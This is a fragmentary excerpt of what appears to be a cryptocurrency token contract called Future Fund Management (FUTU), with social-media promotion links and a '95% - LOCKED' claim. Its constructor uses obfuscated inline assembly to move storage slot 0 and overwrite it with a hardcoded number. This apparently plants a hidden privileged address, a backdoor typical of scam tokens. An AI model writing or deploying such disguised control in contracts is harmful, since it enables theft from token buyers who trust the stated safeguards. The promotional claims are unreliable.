...
Telegram: https://t.me/FutureFundManagement/
Twitter: https://twitter.com/FutureFundManagement/
Website: https://FutureFundManagement.finance
95% - LOCKED
...
contract FutureFundManagement {
    string public constant name = "Future Fund Management";
    string public constant symbol = "FUTU";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1300732863882160941844720950521617647051323572348, 2))}
